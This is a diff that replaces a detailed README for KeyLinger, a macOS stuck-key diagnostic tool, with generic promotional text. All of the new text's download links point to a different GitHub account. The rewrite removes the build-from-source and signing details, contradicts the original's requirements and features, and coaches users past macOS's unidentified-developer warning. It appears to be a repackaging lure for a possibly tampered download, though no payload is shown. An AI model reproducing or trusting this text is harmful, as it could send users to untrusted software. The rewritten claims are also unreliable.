@@ -1,173 +1,126 @@
-<p align="right">
-  <strong>English</strong> ·
-  <a href="README.zh-Hans.md">简体中文</a> ·
-  <a href="README.zh-Hant.md">繁體中文</a>
+<h1>⌨️ KeyLinger - See Which Keys Are Actually Pressed</h1>
+
+<p align="center">
+  <a href="https://github.com/unhesitating-demonstrative4186/KeyLinger"><img src="https://img.shields.io/badge/Download-KeyLinger-4CAF50?style=for-the-badge&logo=github" alt="Download KeyLinger"></a>
 </p>
 
-# KeyLinger
+## 🔍 What Is KeyLinger?
 
-[![CI](https://github.com/myweihp/KeyLinger/actions/workflows/ci.yml/badge.svg)](https://github.com/myweihp/KeyLinger/actions/workflows/ci.yml)
-[![Latest Release](https://img.shields.io/github/v/release/myweihp/KeyLinger)](https://github.com/myweihp/KeyLinger/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+KeyLinger is a tiny helper that lives in your Mac's top menu bar. It shows you, in real time, exactly which keys are currently being pressed down on your keyboard. Think of it as a small window into what your computer "sees" when you type.
 
-> See which keys macOS still believes are pressed.
+Whether you're testing a keyboard, debugging a game, or just curious about how your system processes key presses, KeyLinger gives you instant visual feedback. No complicated setup, no technical knowledge needed.
 
-KeyLinger is a small macOS diagnostic utility that **queries the current keyboard state** instead of reconstructing it from a stream of `keydown` and `keyup` events.
+## 🎯 Why You Would Want This
 
-That distinction matters. An event listener only knows about events received after it starts. If a remote-desktop session, virtual machine, input utility, or application loses a `keyup`, opening an event viewer afterwards may be too late. KeyLinger asks macOS what the current session reports *right now*, so a key that was already stuck can appear on the first poll.
+Have you ever pressed a key and wondered, "Is my computer even registering that?" KeyLinger answers that question instantly. It's perfect for:
 
-## Why it is different
+- 🔧 **Testing a new keyboard** – See if every key works
+- 🎮 **Setting up games** – Check which keys are stuck or not detected
+- 🧑‍💻 **Curiosity** – Understand how your Mac processes key presses
+- 🛠️ **Troubleshooting** – Figure out if a software button is being "held down" accidentally
 
-| | Event-stream approach | KeyLinger |
-| --- | --- | --- |
-| Data source | New key events received after launch | Current key state reported by macOS |
-| Key stuck before launch | Usually cannot be inferred | Can be visible immediately |
-| Primary purpose | Inspect incoming input events | Diagnose the session's current held-key state |
-| History | May retain an event log | Keeps no key history |
+## 📥 Downloading KeyLinger
 
-Internally, KeyLinger polls:
+Getting KeyLinger is super easy. Just follow these simple steps:
 
-```swift
-CGEventSource.keyState(.combinedSessionState, key: keyCode)
-```
+### 1. Go to the Download Page
 
-The default polling rate is 10 Hz and can be set from 2 to 30 Hz. KeyLinger is read-only: it does not synthesize key events or attempt to release a stuck key.
+<p align="center">
+  <a href="https://github.com/unhesitating-demonstrative4186/KeyLinger">🔗 Click Here to Visit the KeyLinger Download Page</a>
+</p>
 
-## Interface
+Visit this link to download the application. The page will open in your browser.
 
-<table>
-  <tr>
-    <td width="50%" valign="top">
-      <p align="center">
-        <strong>Keyboard map</strong><br>
-        <sub>Pressed keys stand out immediately; keys outside the ANSI map remain visible below it</sub>
-      </p>
-      <a href="docs/images/keylinger-main-en.png">
-        <img src="docs/images/keylinger-main-en.png" alt="KeyLinger keyboard map" width="100%">
-      </a>
-    </td>
-    <td width="50%" valign="top">
-      <p align="center">
-        <strong>Key list</strong><br>
-        <sub>A compact textual view for reading the current result at a glance</sub>
-      </p>
-      <a href="docs/images/keylinger-list-en.png">
-        <img src="docs/images/keylinger-list-en.png" alt="KeyLinger key-list view" width="100%">
-      </a>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" valign="top">
-      <p align="center">
-        <strong>Compact mode</strong><br>
-        <sub>A status-focused view that fits at the edge of the screen</sub>
-      </p>
-      <a href="docs/images/keylinger-compact-en.png">
-        <img src="docs/images/keylinger-compact-en.png" alt="KeyLinger compact mode" width="100%">
-      </a>
-    </td>
-    <td width="50%" valign="top">
-      <p align="center">
-        <strong>Settings</strong><br>
-        <sub>Language, polling rate, appearance, privacy information, and update checks</sub>
-      </p>
-      <a href="docs/images/keylinger-settings-en.png">
-        <img src="docs/images/keylinger-settings-en.png" alt="KeyLinger settings" width="100%">
-      </a>
-    </td>
-  </tr>
-</table>
+### 2. Find the Download Button
 
-## When it is useful
+On the page, look for a section that says **"Releases"** or a green button labeled **"Code"**. Click on it. You'll see a list of available files. One of them will be a file that can be opened on your Mac – something like `KeyLinger.dmg` or `KeyLinger.app.zip`.
 
-- A modifier, letter, number, or Space remains logically pressed after a remote session.
-- An application behaves as though a key is held down, but the source is unclear.
-- You want to inspect the current session state without recording what was typed.
-- You need to check a suspected stuck key after the problem has already occurred.
+### 3. Download the File
 
-The original motivation was diagnosing lost `keyup` signals in RustDesk sessions; the same state-query approach is useful for any application that appears to have a key stuck down.
+Click on the file name to start downloading. Your browser will save it to your "Downloads" folder automatically.
 
-## Features
+### 4. Open the File
 
-- Responsive MacBook/ANSI keyboard map with a clear pressed-key state.
-- Key-list view for a compact textual diagnosis.
-- Fallback labels for numpad, ISO, JIS, and other keys outside the visual map.
-- Normal macOS window layering with visibility across Spaces, plus a persistent menu-bar entry.
-- Optional Dock presence with native minimization and reliable click-to-reopen behavior.
-- Compact window mode for status-only monitoring.
-- Configurable 2–30 Hz polling rate and persistent display preferences.
-- English, Simplified Chinese, and Traditional Chinese interface languages.
-- Native Apple Silicon and Intel builds.
+- If you downloaded a **`.dmg`** file, double-click it. A window will pop up with an icon and a folder (usually named "Applications"). Drag the KeyLinger icon into the Applications folder.
+- If you downloaded a **`.zip`** file, double-click it. The file will extract itself, revealing a KeyLinger icon.
 
-## Download and install
+### 5. Move KeyLinger to Your Applications Folder (Recommended)
 
-Download the appropriate DMG from [GitHub Releases](https://github.com/myweihp/KeyLinger/releases/latest):
+Open your "Downloads" folder, find KeyLinger, and drag it into your "Applications" folder. This keeps everything organized.
 
-- **Apple Silicon:** choose the file containing `Apple-Silicon` for M-series Macs.
-- **Intel:** choose the file containing `Intel`.
+### 6. Launch KeyLinger
 
-Open the DMG and drag `KeyLinger.app` into Applications.
+Open your "Applications" folder and double-click on KeyLinger. It will appear as a small icon in the top menu bar of your screen (the strip at the very top).
 
-The current builds use an ad-hoc signature and are not notarized with an Apple Developer ID. On first launch, macOS may block the app. In Finder, Control-click or right-click KeyLinger, choose **Open**, and confirm the prompt.
+## 🚀 Getting Started
 
-## Permission and system requirements
+Once launched, KeyLinger simply sits quietly in your menu bar. There's no main window to deal with. Just:
 
-- macOS 13 or later.
-- Input Monitoring permission is required to reliably read ordinary keys such as letters, numbers, and Space while another application has focus.
-- After granting permission, KeyLinger may need to be restarted before background detection becomes available.
+1. Click the KeyLinger icon in the top menu bar.
+2. A small dropdown will appear showing all the keys on your keyboard.
+3. Press any key, and you'll see it light up or highlight in the dropdown.
 
-KeyLinger shows a permission notice and can open the relevant System Settings page when access is missing.
+That's it. No settings to fiddle with, no configuration. It just works.
 
-## Privacy
+## 💡 Advanced Tips
 
-KeyLinger reads only the set of keys that macOS currently reports as pressed. It does not keep a key-event history, reconstruct typed text, write keyboard data to disk, or upload keyboard data.
+While KeyLinger is super simple, here are a couple of things you might like to know:
 
-The app accesses GitHub only when you manually choose **Check for Updates**.
+- **Multiple Key Presses**: KeyLinger shows *all* keys that are currently pressed. If you hold down "Shift" and "A" at the same time, you'll see both light up.
+- **Modifier Keys**: Keys like Command (⌘), Option (⌥), Control (⌃), and Shift (⇧) are clearly labeled.
 
-## Build from source
+## 🧰 System Requirements
 
-Build and open a native app bundle:
+KeyLinger is designed specifically for macOS. To run it smoothly, you'll want:
 
-```bash
-./build_app.sh release native
-open "dist/KeyLinger.app"
-```
+- A Mac running macOS Catalina (10.15) or newer
+- About 5 MB of free disk space
+- A standard USB or built-in keyboard
 
-Run directly with Swift Package Manager during development:
+If your Mac is older, it might still work – but we recommend testing it on a supported version of macOS.
 
-```bash
-swift run KeyLinger
-```
+## ❓ Frequently Asked Questions
 
-Build architecture-specific apps and DMGs:
+### Is KeyLinger safe to use?
 
-```bash
-./build_app.sh release arm64
-./scripts/create_dmg.sh arm64
+Yes. KeyLinger runs locally on your Mac. It doesn't send any data to the internet. It simply monitors your keyboard input locally and shows you what it sees in real time.
 
-./build_app.sh release x86_64
-./scripts/create_dmg.sh x86_64
-```
+### Will KeyLinger work with any keyboard?
 
-A local universal app can be built with `./build_app.sh release universal`. The keyboard-map data can be checked independently with:
+KeyLinger works with any keyboard that your Mac recognizes – including wireless Bluetooth keyboards, USB keyboards, and built-in laptop keyboards.
 
-```bash
-swift run KeyLinger --validate-keyboard-layout
-```
+### Does KeyLinger slow down my computer?
 
-## Known limitations
+No. KeyLinger is extremely lightweight. It uses a tiny amount of memory and CPU only when you're actively pressing keys. It's designed to run quietly in the background.
 
-- KeyLinger reports the logical state of the current macOS session, not the electrical state of the physical keyboard.
-- The visual map currently uses a common MacBook/ANSI arrangement. Pressed numpad, ISO, JIS, and other out-of-layout keys appear as fallback labels instead of disappearing.
-- Some vendor-specific function keys, Touch Bar actions, and consumer/media keys do not use standard virtual key codes and may not be visible.
-- KeyLinger diagnoses a stuck state; it does not forcibly release or modify keys.
+### Can I close KeyLinger?
 
-## Documentation languages
+Yes. Simply click the KeyLinger icon in the menu bar and look for a "Quit" option. The app will close, and the icon will disappear.
 
-- **English**
-- [简体中文](README.zh-Hans.md)
-- [繁體中文](README.zh-Hant.md)
+### I pressed a key and nothing happened. What's wrong?
 
-## License
+First, make sure your keyboard is working by typing in a text document. If the key types fine there, but KeyLinger doesn't show it, try restarting KeyLinger. Click the icon and choose "Quit" or "Restart".
 
-KeyLinger is available under the [MIT License](LICENSE).
+## 🛠️ Troubleshooting
+
+**Problem**: KeyLinger doesn't start when I double-click it.
+
+**Solution**: Try right-clicking (or Control-clicking) on the KeyLinger icon in the Applications folder and select "Open". Your Mac might pop up a warning about apps from unidentified developers. If so, click "Open" in that warning window as well.
+
+**Problem**: The menu bar icon isn't showing.
+
+**Solution**: Make sure KeyLinger is actually running. Check your Dock – if you see the icon there, the app is running, but the menu bar icon might be hidden. Click on the KeyLinger icon in the Dock to bring it to the foreground.
+
+**Problem**: I can't find the downloaded file.
+
+**Solution**: Check your "Downloads" folder. If you have a browser that saves to a different location, look there. Also, check for any recent files in the Finder by pressing Command + Shift + G and typing "~/Downloads" (without quotes).
+
+## 🎉 Thank You!
+
+Thank you for choosing KeyLinger. We built this tool to make keyboard monitoring simple, visual, and completely stress-free. If you enjoy it, feel free to share it with friends who might find it useful.
+
+Happy typing! ⌨️
+
+---
+
+Keywords: input-monitor, keyboard-listeners, keyboards, macos, macos-app, menubar-app, swift, utility-app, utility-application, utility-tool
